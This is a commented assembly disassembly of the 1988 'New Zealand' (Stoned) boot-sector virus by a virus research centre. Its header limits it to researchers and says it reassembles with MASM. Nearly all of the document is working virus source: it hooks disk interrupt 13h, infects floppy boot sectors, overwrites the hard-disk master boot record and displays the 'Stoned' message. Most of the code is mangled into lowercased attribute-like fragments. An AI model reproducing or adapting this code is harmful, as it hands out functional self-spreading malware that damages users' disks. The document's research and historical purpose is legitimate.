

;
; IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM;
; :                 British Computer Virus Research Centre                   :
; :  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    :
; :  Telephone:     Domestic   0273-26105,   International  +44-273-26105    :
; :                                                                          :
; :                         The 'New Zealand' Virus                          :
; :                Disassembled by Joe Hirst,   November 1988                :
; :                                                                          :
; :                   Copyright (c) Joe Hirst 1988, 1989.                    :
; :                                                                          :
; :      This listing is only to be made available to virus researchers      :
; :                or software writers on a need-to-know basis.              :
; HMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM< ;="" the="" virus="" consists="" of="" a="" boot="" sector="" only.="" the="" original="" boot="" sector="" ;="" is="" kept="" at="" track="" zero,="" head="" one,="" sector="" three="" on="" a="" floppy="" disk,="" or="" ;="" track="" zero,="" head="" zero,="" sector="" two="" on="" a="" hard="" disk.="" ;="" the="" disassembly="" has="" been="" tested="" by="" re-assembly="" using="" masm="" 5.0.="" ;="" the="" program="" requires="" an="" origin="" address="" of="" 7c00h,="" as="" it="" is="" designed="" ;="" to="" load="" and="" run="" as="" a="" boot="" sector.="" ram="" segment="" at="" 0="" ;="" system="" data="" org="" 4ch="" bw004c="" dw="" ;="" interrupt="" 19="" (13h)="" offset="" bw004e="" dw="" ;="" interrupt="" 19="" (13h)="" segment="" org="" 413h="" bw0413="" dw="" ;="" total="" ram="" size="" org="" 440h="" bb0440="" db="" ;="" motor="" timeout="" counter="" org="" 46ch="" bb046c="" db="" ;="" system="" clock="" org="" 7c0ah="" i13_of="" dw="" i13_sg="" dw="" hicoof="" dw="" hicosg="" dw="" ;="" high="" core="" segment="" ram="" ends="" code="" segment="" byte="" public="" 'code'="" assume="" cs:code,ds:ram="" start:="" db="" 0eah="" ;="" far="" jump="" to="" next="" byte="" dw="" bp0010,="" 07c0h="" bp0010:="" jmp="" bp0110="" driven="" db="" 0="" ;="" drive="" number="" (a="0," b="1," c="2)" dummy="" db="" 0="" ;="" original="" int="" 13h="" address="" int_13="" equ="" this="" dword="" dw="" 0="" dw="" 0="" ;="" branch="" address="" in="" high="" core="" highco="" equ="" this="" dword="" dw="" bp0120="" dw="" 0="" ;="" boot="" sector="" processing="" address="" bootst="" equ="" this="" dword="" dw="" 07c00h="" dw="" 0="" ;="" interrupt="" 13h="" disk="" i/o="" routine="" bp0020:="" push="" ds="" push="" ax="" cmp="" ah,2="" ;="" sub-function="" 2="" jb="" bp0030="" ;="" pass="" on="" if="" below="" cmp="" ah,4="" ;="" sub-function="" 4="" jnb="" bp0030="" ;="" pass="" on="" if="" not="" below="" cmp="" dl,0="" ;="" is="" drive="" a="" jne="" bp0030="" ;="" pass="" on="" if="" not="" xor="" ax,ax="" ;="" \="" segment="" zero="" mov="" ds,ax="" ;="" mov="" al,bb0440="" ;="" get="" motor="" timeout="" counter="" or="" al,al="" ;="" test="" for="" zero="" jne="" bp0030="" ;="" branch="" if="" not="" call="" bp0040="" ;="" call="" infection="" routine="" bp0030:="" pop="" ax="" pop="" ds="" jmp="" int_13="" ;="" pass="" control="" to="" int="" 13h="" ;="" infection="" routine="" bp0040:="" push="" bx="" push="" cx="" push="" dx="" push="" es="" push="" si="" push="" di="" mov="" si,4="" ;="" retry="" count="" bp0050:="" mov="" ax,201h="" ;="" read="" one="" sector="" push="" cs="" ;="" \="" set="" es="" to="" cs="" pop="" es="" ;="" mov="" bx,200h="" ;="" boot="" sector="" buffer="" mov="" cx,1="" ;="" track="" zero,="" sector="" 1="" xor="" dx,dx="" ;="" head="" zero,="" drive="" a="" pushf="" ;="" fake="" an="" interrupt="" call="" int_13="" ;="" call="" int="" 13h="" jnb="" bp0060="" ;="" branch="" if="" no="" error="" xor="" ax,ax="" ;="" reset="" disk="" sub-system="" pushf="" ;="" fake="" an="" interrupt="" call="" int_13="" ;="" call="" int="" 13h="" dec="" si="" ;="" decrement="" retry="" count="" jne="" bp0050="" ;="" retry="" jmp="" bp0080="" ;="" no="" more="" retries="" bp0060:="" xor="" si,si="" ;="" start="" of="" program="" mov="" di,200h="" ;="" boot="" sector="" buffer="" mov="" ax,es:[si]="" ;="" get="" first="" word="" cmp="" ax,es:[di]="" ;="" test="" if="" same="" jne="" bp0070="" ;="" install="" if="" not="" mov="" ax,es:[si+2]="" ;="" get="" second="" word="" cmp="" ax,es:[di+2]="" ;="" test="" if="" same="" jne="" bp0070="" ;="" install="" if="" not="" jmp="" bp0080="" ;="" pass="" on="" bp0070:="" mov="" ax,301h="" ;="" write="" one="" sector="" mov="" bx,200h="" ;="" boot="" sector="" buffer="" mov="" cx,3="" ;="" track="" zero,="" sector="" 3="" mov="" dx,100h="" ;="" head="" 1,="" drive="" a="" pushf="" ;="" fake="" an="" interrupt="" call="" int_13="" ;="" call="" int="" 13h="" jb="" bp0080="" ;="" branch="" if="" error="" mov="" ax,301h="" ;="" write="" one="" sector="" xor="" bx,bx="" ;="" this="" sector="" mov="" cl,1="" ;="" track="" zero,="" sector="" 1="" xor="" dx,dx="" ;="" head="" zero,="" drive="" a="" pushf="" ;="" fake="" an="" interrupt="" call="" int_13="" ;="" call="" int="" 13h="" bp0080:="" pop="" di="" pop="" si="" pop="" es="" pop="" dx="" pop="" cx="" pop="" bx="" ret="" ;="" display="" message="" bp0090:="" mov="" al,cs:[bx]="" ;="" get="" next="" message="" byte="" inc="" bx="" ;="" update="" pointer="" cmp="" al,0="" ;="" test="" for="" end="" of="" message="" jne="" bp0100="" ;="" branch="" to="" display="" ret="" bp0100:="" push="" ax="" push="" bx="" mov="" ah,0eh="" ;="" write="" tty="" mode="" mov="" bh,0="" int="" 10h="" ;="" vdu="" i/o="" pop="" bx="" pop="" ax="" jmp="" short="" bp0090="" ;="" process="" next="" byte="" ;="" install="" in="" high="" core="" bp0110:="" xor="" ax,ax="" ;="" \="" segment="" zero="" mov="" ds,ax="" ;="" cli="" mov="" ss,ax="" ;="" \="" set="" stack="" to="" boot="" sector="" area="" mov="" sp,7c00h="" ;="" sti="" mov="" ax,bw004c="" ;="" get="" int="" 13h="" offset="" mov="" i13_of,ax="" ;="" store="" in="" jump="" offset="" mov="" ax,bw004e="" ;="" get="" int="" 13h="" segment="" mov="" i13_sg,ax="" ;="" store="" in="" jump="" segment="" mov="" ax,bw0413="" ;="" get="" total="" ram="" size="" dec="" ax="" ;="" \="" subtract="" 2k="" dec="" ax="" ;="" mov="" bw0413,ax="" ;="" replace="" total="" ram="" size="" mov="" cl,6="" ;="" bits="" to="" move="" shl="" ax,cl="" ;="" convert="" to="" segment="" mov="" es,ax="" ;="" set="" es="" to="" segment="" mov="" hicosg,ax="" ;="" move="" segment="" to="" jump="" address="" mov="" ax,offset="" bp0020="" ;="" get="" int="" 13h="" routine="" address="" mov="" bw004c,ax="" ;="" set="" new="" int="" 13h="" offset="" mov="" bw004e,es="" ;="" set="" new="" int="" 13h="" segment="" mov="" cx,offset="" endadr="" ;="" load="" length="" of="" program="" push="" cs="" ;="" \="" set="" ds="" to="" cs="" pop="" ds="" ;="" xor="" si,si="" ;="" \="" set="" pointers="" to="" zero="" mov="" di,si="" ;="" cld="" repz="" movsb="" ;="" copy="" program="" to="" high="" core="" jmp="" highco="" ;="" branch="" to="" next="" instruc="" in="" high="" core="" ;="" continue="" processing="" in="" high="" core="" bp0120:="" mov="" ax,0="" ;="" reset="" disk="" sub-system="" int="" 13h="" ;="" disk="" i/o="" xor="" ax,ax="" ;="" \="" segment="" zero="" mov="" es,ax="" ;="" assume="" ds:nothing,es:ram="" mov="" ax,201h="" ;="" read="" one="" sector="" mov="" bx,7c00h="" ;="" boot="" sector="" buffer="" address="" cmp="" driven,0="" ;="" test="" drive="" is="" a="" je="" bp0130="" ;="" branch="" if="" yes="" mov="" cx,2="" ;="" track="" zero,="" sector="" 2="" mov="" dx,80h="" ;="" side="" zero,="" drive="" c="" int="" 13h="" ;="" disk="" i/o="" jmp="" bp0150="" ;="" pass="" control="" to="" boot="" sector="" ;="" floppy="" disk="" bp0130:="" mov="" cx,3="" ;="" track="" zero,="" sector="" 3="" mov="" dx,100h="" ;="" side="" one,="" drive="" a="" int="" 13h="" ;="" disk="" i/o="" jb="" bp0150="" ;="" branch="" if="" error="" test="" bb046c,7="" ;="" test="" low="" byte="" of="" time="" jnz="" bp0140="" ;="" branch="" if="" not="" 7="" mov="" bx,offset="" message="" ;="" load="" message="" address="" call="" bp0090="" ;="" display="" message="" bp0140:="" push="" cs="" ;="" \="" set="" es="" to="" cs="" pop="" es="" ;="" mov="" ax,201h="" ;="" read="" one="" sector="" mov="" bx,200h="" ;="" c-disk="" boot="" sector="" buffer="" mov="" cx,1="" ;="" track="" zero,="" sector="" 1="" mov="" dx,80h="" ;="" side="" zero,="" drive="" c="" int="" 13h="" ;="" disk="" i/o="" jb="" bp0150="" ;="" branch="" if="" error="" push="" cs="" ;="" \="" set="" ds="" to="" cs="" pop="" ds="" ;="" mov="" si,200h="" ;="" c-disk="" boot="" sector="" buffer="" mov="" di,0="" ;="" start="" of="" program="" mov="" ax,[si]="" ;="" get="" first="" word="" cmp="" ax,[di]="" ;="" compare="" to="" c-disk="" jne="" bp0160="" ;="" install="" on="" c-disk="" if="" different="" mov="" ax,[si+2]="" ;="" get="" second="" word="" cmp="" ax,[di+2]="" ;="" compare="" to="" c-disk="" jne="" bp0160="" ;="" install="" on="" c-disk="" if="" different="" bp0150:="" mov="" driven,0="" ;="" drive="" a="" mov="" dummy,0="" jmp="" bootst="" ;="" pass="" control="" to="" boot="" sector="" ;="" install="" on="" c-disk="" bp0160:="" mov="" driven,2="" ;="" drive="" c="" mov="" dummy,0="" mov="" ax,301h="" ;="" write="" one="" sector="" mov="" bx,200h="" ;="" c-disk="" boot="" sector="" buffer="" mov="" cx,2="" ;="" track="" zero,="" sector="" 2="" mov="" dx,80h="" ;="" side="" zero,="" drive="" c="" int="" 13h="" ;="" disk="" i/o="" jb="" bp0150="" ;="" branch="" if="" error="" push="" cs="" ;="" \="" set="" ds="" to="" cs="" pop="" ds="" ;="" push="" cs="" ;="" \="" set="" es="" to="" cs="" pop="" es="" ;="" mov="" si,offset="" endadr+200h="" ;="" target="" offset="" mov="" di,offset="" endadr="" ;="" source="" offset="" mov="" cx,offset="" endadr-400h="" ;="" length="" to="" move="" repz="" movsb="" ;="" copy="" c-disk="" boot="" sector="" mov="" ax,301h="" ;="" write="" one="" sector="" mov="" bx,0="" ;="" write="" this="" sector="" mov="" cx,1="" ;="" track="" zero,="" sector="" 1="" mov="" dx,80h="" ;="" side="" zero,="" drive="" c="" int="" 13h="" ;="" disk="" i/o="" jmp="" short="" bp0150="" ;="" pass="" control="" to="" boot="" sector="" message="" db="" 7,="" 'your="" pc="" is="" now="" stoned!',="" 7,="" 0dh,="" 0ah,="" 0ah,="" 0="" db="" 'legalise="" marijuana!'="" endadr="" equ="" $-1="" code="" ends="" end="" start="">